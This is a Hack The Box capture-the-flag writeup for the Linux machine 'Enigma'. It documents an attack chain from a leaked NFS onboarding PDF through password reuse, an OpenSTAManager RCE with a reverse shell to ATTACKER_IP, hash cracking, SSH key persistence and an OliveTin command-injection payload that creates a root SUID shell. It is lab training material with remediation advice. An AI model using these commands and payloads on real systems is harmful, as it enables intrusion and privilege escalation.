# Hack The Box — Enigma Writeup

> **Active-machine material — private only. Do not publish until Enigma has retired.**

## Machine information

| Field | Value |
| --- | --- |
| Machine | Enigma |
| Platform | Hack The Box |
| Season | 11 |
| OS | Linux |
| Difficulty | Easy |
| Category | NFS / Webmail / Password reuse / OpenSTAManager / OliveTin |
| Initial access | NFS onboarding PDF leaking webmail credentials |
| Privilege escalation | OliveTin command injection in a root-owned backup action |

## Summary

Enigma is a Linux machine where the full compromise comes from chaining several realistic operational mistakes rather than relying on a single direct root exploit.

The path starts with an exposed NFS onboarding share containing a PDF with Kevin's webmail credentials. Kevin's mailbox reveals Sarah as an internal user, and the same onboarding password works for Sarah. Sarah's mailbox then leaks administrator credentials for an internal OpenSTAManager portal.

After authenticating to OpenSTAManager, its vulnerable module/update upload functionality is abused to obtain remote code execution as `www-data`. The web application configuration exposes MySQL credentials, the database contains user password hashes, and the `haris` bcrypt hash is cracked with John the Ripper.

For privilege escalation, OliveTin is discovered running as `root` on localhost. An SSH tunnel exposes the local web interface, and the `Backup Database` action is vulnerable to command injection through the `db_pass` field. Because OliveTin executes the action as root, the injection creates a SUID bash binary and gives an effective root shell.

## Complete attack chain

```text
1. Reconnaissance revealed multiple exposed services:
   - HTTP
   - IMAP/POP3 mail services
   - NFS
   - SSH

2. NFS exposed an onboarding share:
   /srv/nfs/onboarding

3. The NFS share contained:
   New_Employee_Access.pdf

4. The PDF leaked Kevin's webmail credentials:
   kevin:Enigma2024!

5. Kevin's mailbox revealed Sarah as an internal user.

6. The same onboarding password was reused for Sarah:
   sarah:Enigma2024!

7. Sarah's mailbox contained admin credentials for the internal support portal:
   http://support_001.enigma.htb
   admin:Ne3s4rtars78s

8. The support portal was running OpenSTAManager 2.9.8.

9. OpenSTAManager was exploited through its vulnerable module/update upload functionality,
   giving remote code execution as www-data.

10. As www-data, the OpenSTAManager configuration file exposed database credentials:
    brollin:Fri3nds@9099

11. The MySQL database contained application user hashes in the zz_users table.

12. The bcrypt hash for haris was extracted and cracked with John the Ripper:
    haris:bestfriends

13. The cracked password allowed lateral movement:
    su haris

14. As haris, OliveTin was discovered running locally on:
    127.0.0.1:1337

15. OliveTin was running as root.

16. Since OliveTin only listened on localhost, SSH local port forwarding was used:
    ssh -i haris_key -L 1337:127.0.0.1:1337 haris@TARGET

17. The OliveTin web interface exposed a Backup Database action.

18. The real OliveTin configuration was found at:
    /etc/OliveTin/config.yaml

19. The Backup Database action built a shell command using user-controlled input:
    mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql

20. The db_pass field was vulnerable to command injection.

21. The quote was escaped and a SUID bash was created:
    '; mkdir -p /opt/backups; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #

22. The SUID bash was executed with -p:
    /tmp/rootbash -p

23. This gave a shell with effective UID root:
    euid=0(root)

24. root.txt was read.
```

In short:

```text
NFS leak
→ Kevin webmail
→ Sarah via password reuse
→ OpenSTAManager admin access
→ OpenSTAManager RCE
→ www-data shell
→ database credentials
→ bcrypt hash cracking
→ haris user
→ OliveTin localhost tunnel
→ command injection in Backup Database
→ SUID bash
→ root
```

## 1. Reconnaissance

Start with service enumeration:

```bash
nmap -sV -Pn TARGET
```

Open services:

```text
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu
80/tcp    open  http     nginx
110/tcp   open  pop3     Dovecot pop3d
111/tcp   open  rpcbind
143/tcp   open  imap     Dovecot imapd
993/tcp   open  ssl/imap Dovecot imapd
995/tcp   open  ssl/pop3 Dovecot pop3d
2049/tcp  open  nfs_acl
```

The most interesting services were:

```text
NFS
Dovecot IMAP/POP3
nginx HTTP
SSH
```

NFS was the first promising target because exposed shares often leak onboarding files, internal documentation, or credentials.

## 2. NFS enumeration

List exported NFS shares:

```bash
showmount -e TARGET
```

Output:

```text
Export list for TARGET:
/srv/nfs/onboarding *
```

The `*` means the share is available broadly, which is already a dangerous configuration.

List the share:

```bash
nfs-ls nfs://TARGET/srv/nfs/onboarding/
```

Output:

```text
-rw-r--r--  1 0 0 1751 New_Employee_Access.pdf
```

The share contained one interesting file:

```text
New_Employee_Access.pdf
```

### NFS transfer issue and MTU fix

Listing the share worked, but copying or reading the PDF initially froze or produced an empty file. The issue was not the PDF itself; large packets were being dropped through the VPN interface.

Packet-size testing:

```bash
ping -M do -s 1400 TARGET
ping -M do -s 1300 TARGET
ping -M do -s 1200 TARGET
```

Lowering the VPN MTU fixed the issue:

```bash
sudo ip link set dev tun0 mtu 1200
```

After that, the file could be downloaded:

```bash
nfs-cat nfs://TARGET/srv/nfs/onboarding/New_Employee_Access.pdf > New_Employee_Access.pdf
```

Extract the PDF text:

```bash
pdftotext New_Employee_Access.pdf pdf.txt
cat pdf.txt
```

The PDF contained onboarding credentials:

```text
Employee:
Kevin Mitchell

Webmail Access
URL:
http://mail001.enigma.htb

Username:
kevin

Password:
Enigma2024!
```

Credentials found:

```text
kevin:Enigma2024!
```

Add the virtual host:

```text
TARGET enigma.htb mail001.enigma.htb
```

## 3. Webmail access as Kevin

Navigate to:

```text
http://mail001.enigma.htb
```

The application is a Roundcube webmail instance, and the PDF credentials work:

```text
kevin:Enigma2024!
```

Kevin's mailbox contains a message from:

```text
sarah@enigma.htb
```

The email does not directly contain Sarah's credentials, but it reveals a valid internal username. Because the password looks like a generic onboarding password, testing reuse is reasonable:

```text
sarah:Enigma2024!
```

This works and gives access to Sarah's mailbox.

## 4. Accessing Sarah's mailbox

Sarah's mailbox can also be queried through POP3S:

```bash
curl -k --user 'sarah:Enigma2024!' pop3s://TARGET/1
```

The mailbox contains internal support portal credentials:

```text
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

New credentials:

```text
admin:Ne3s4rtars78s
```

Add the support virtual host:

```text
TARGET enigma.htb mail001.enigma.htb support_001.enigma.htb
```

## 5. OpenSTAManager admin access

Browse to:

```text
http://support_001.enigma.htb
```

The portal is an OpenSTAManager instance. The leaked admin credentials work:

```text
admin:Ne3s4rtars78s
```

The identified version is:

```text
OpenSTAManager 2.9.8
```

With administrator access, the module/update functionality becomes the next target.

## 6. OpenSTAManager RCE

OpenSTAManager is exploited through its vulnerable module/update upload workflow:

```text
Login as admin
Enable updates
Create malicious module ZIP
Upload module
Place webshell under /modules/shell/shell.php
Trigger reverse shell
```

Exploit command:

```bash
./openstamanager-rce-exploit \
  --url http://support_001.enigma.htb/ \
  -U admin \
  -P Ne3s4rtars78s \
  --lhost ATTACKER_IP \
  --lport 4444
```

The shell is placed at:

```text
http://support_001.enigma.htb/modules/shell/shell.php
```

A Python reverse shell returns a shell as:

```bash
www-data@enigma
```

Confirm identity:

```bash
id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 7. Local enumeration as www-data

The home directories exist but are not readable:

```bash
ls /home
```

```text
haris  it  kevin  sarah
```

Trying to enter user home directories fails with permission errors, so the better path is to inspect application configuration files.

The OpenSTAManager web root contains:

```text
config.php
config.inc.php
modules/
plugins/
api/
```

The template `config.php` does not contain real secrets:

```php
$db_host = '|host|';
$db_username = '|username|';
$db_password = '|password|';
$db_name = '|database|';
```

The real configuration is `config.inc.php`:

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

Database credentials:

```text
brollin:Fri3nds@9099
database: openstamanager
host: localhost
```

Because the database only listens locally, MySQL enumeration must be run from the victim machine.

## 8. Dumping the OpenSTAManager database

Test MySQL access:

```bash
mysql -u brollin -p'Fri3nds@9099' -e "show databases;"
```

Output:

```text
information_schema
openstamanager
performance_schema
```

List tables:

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "show tables;"
```

The interesting table is:

```text
zz_users
```

Dump it:

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "select * from zz_users\G"
```

Relevant entries:

```text
username: admin
password: $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
email: admin@enigma.htb
```

```text
username: haris
password: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
email: haris@enigma.htb
```

The `haris` bcrypt hash is the useful lateral-movement target.

## 9. Cracking the bcrypt hash

On Kali:

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

John cracks the password:

```text
bestfriends
```

Credentials:

```text
haris:bestfriends
```

Switch user:

```bash
su haris
```

Read the user flag:

```bash
cd /home/haris
cat user.txt
```

## 10. Stabilizing access with SSH

Create an SSH key:

```bash
ssh-keygen -f haris_key -N ''
cat haris_key.pub
```

Add the public key on the victim as `haris`:

```bash
mkdir -p ~/.ssh
echo 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

Connect:

```bash
ssh -i haris_key haris@TARGET
```

This gives a stable SSH session as `haris`.

## 11. Privilege escalation enumeration

Check sudo privileges:

```bash
sudo -l
```

Output:

```text
Sorry, user haris may not run sudo on enigma.
```

Check SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

Only standard binaries appear, so there is no obvious custom SUID path.

Check `/opt`:

```bash
ls -la /opt
```

Output:

```text
OliveTin
roundcube
```

Kevin's password is valid but the account cannot be used interactively:

```bash
su kevin
```

```text
This account is currently not available.
```

Forcing a shell does not bypass the restricted login shell:

```bash
su -s /bin/bash kevin
```

```text
su: using restricted shell /usr/sbin/nologin
This account is currently not available.
```

## 12. Discovering OliveTin running as root

Check the OliveTin process:

```bash
ps auxww | grep -i OliveTin | grep -v grep
```

Output:

```text
root  1500  ...  /usr/local/bin/OliveTin
```

OliveTin is running as `root`.

Check listening ports:

```bash
ss -lntp | grep 1337
```

Output:

```text
LISTEN 0 4096 127.0.0.1:1337 0.0.0.0:*
```

The service only listens on localhost. Testing from the victim confirms the web interface is reachable locally:

```bash
curl -v --max-time 5 http://127.0.0.1:1337/
```

```text
HTTP/1.1 200 OK
<title>OliveTin</title>
```

## 13. Tunneling OliveTin

Since SSH access as `haris` is available, create a local tunnel:

```bash
ssh -i haris_key -L 1337:127.0.0.1:1337 haris@TARGET
```

Then browse locally:

```text
http://127.0.0.1:1337
```

The interface exposes several actions:

```text
Ping the Internet
Check disk space
Run backup script
Ping host
Setup easy SSH
Run Automation Playbook
Backup Database
```

The interesting action is:

```text
Backup Database
```

## 14. Finding the real OliveTin configuration

The first config checked under `/opt/OliveTin/OliveTin-linux-amd64/config.yaml` does not contain the vulnerable action.

Search for the action name and parameters:

```bash
grep -Rni "Backup Database\|db_pass\|backup.sql\|backup_svc\|production" /etc /opt /usr/local 2>/dev/null
```

This reveals the real configuration:

```text
/etc/OliveTin/config.yaml
```

The vulnerable action:

```yaml
- title: Backup Database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
```

Arguments:

```yaml
- name: db_user
  default: backup_svc

- name: db_pass

- name: db_name
  default: production
```

The issue is that `db_pass` is inserted directly into a shell command.

## 15. Command injection in db_pass

The command template is:

```bash
mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
```

With a normal password, it becomes:

```bash
mysqldump -u backup_svc -p'password' production > /opt/backups/backup.sql
```

Payloads such as command substitution do not work directly because `db_pass` is wrapped in single quotes:

```bash
$(cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash)
```

To execute commands, the payload must break out of the single quote.

Final payload for the `db_pass` field:

```bash
'; mkdir -p /opt/backups; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #
```

Resulting command structure:

```bash
mysqldump -u backup_svc -p''; mkdir -p /opt/backups; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #' production > /opt/backups/backup.sql
```

Explanation:

```text
-p''                         empty password for mysqldump
;                            ends the mysqldump command
mkdir -p /opt/backups        creates the backup directory
cp /bin/bash /tmp/rootbash   copies bash
chmod 4755 /tmp/rootbash     sets the SUID bit
#                            comments out the rest of the original command
```

Because OliveTin runs as root, the copied bash binary becomes root-owned and SUID.

## 16. Getting root

After triggering the `Backup Database` action, check the SUID bash:

```bash
ls -la /tmp/rootbash
```

Output:

```text
-rwsr-xr-x 1 root root 1446024 Jun 29 12:10 /tmp/rootbash
```

Run it with `-p`:

```bash
/tmp/rootbash -p
```

Confirm privileges:

```bash
id
```

Output:

```text
uid=1000(haris) gid=1000(haris) euid=0(root) groups=1000(haris),100(users)
```

The real UID remains `haris`, but the effective UID is `root`, which is enough to read root-owned files and execute commands with root privileges.

Read the root flag:

```bash
cat /root/root.txt
```

## 17. Why bash -p matters

When running a SUID bash binary, the `-p` flag is important.

Without `-p`, bash may drop elevated privileges as a safety measure. With:

```bash
/tmp/rootbash -p
```

bash preserves the effective UID:

```text
euid=0(root)
```

## Attack chain summary

```text
NFS leak
→ onboarding PDF
→ Kevin webmail credentials
→ Sarah mailbox via password reuse
→ OpenSTAManager admin credentials
→ OpenSTAManager 2.9.8 RCE
→ www-data shell
→ config.inc.php database credentials
→ zz_users bcrypt hash
→ John cracks haris password
→ haris shell
→ OliveTin running as root on 127.0.0.1:1337
→ SSH tunnel
→ command injection in Backup Database db_pass
→ SUID bash
→ effective root shell
```

## Lessons learned

Enigma is a strong reminder that full compromise often comes from chaining individually small issues:

```text
Exposed NFS share
Credentials stored in onboarding files
Password reuse
Internal credentials sent by email
Vulnerable admin application
Readable application configuration
Crackable password hash
Root-owned automation service
Unsafe shell interpolation
```

The privilege escalation is especially realistic because the vulnerable command looks like a normal administrative automation task:

```bash
mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
```

The dangerous part is not `mysqldump`; it is passing user-controlled input into a shell command without strict validation or safe argument handling.

## Remediation

- Do not expose NFS shares publicly; restrict exports to trusted hosts and enforce least privilege.
- Do not store reusable onboarding passwords in documents.
- Enforce unique credentials and rotate temporary onboarding secrets after first use.
- Avoid sending privileged application credentials by email.
- Patch or replace vulnerable OpenSTAManager deployments.
- Restrict application configuration files to the minimum required local users.
- Store password hashes with strong policies and monitor for weak/reused passwords.
- Do not run automation interfaces as root unless absolutely required.
- Avoid shell interpolation for user-controlled fields; use fixed argument arrays or strict allowlists.
- Bind local administrative services to localhost only when paired with strong local access controls and authentication.

## Flags

```text
user.txt: [REDACTED]
root.txt: [REDACTED]
```

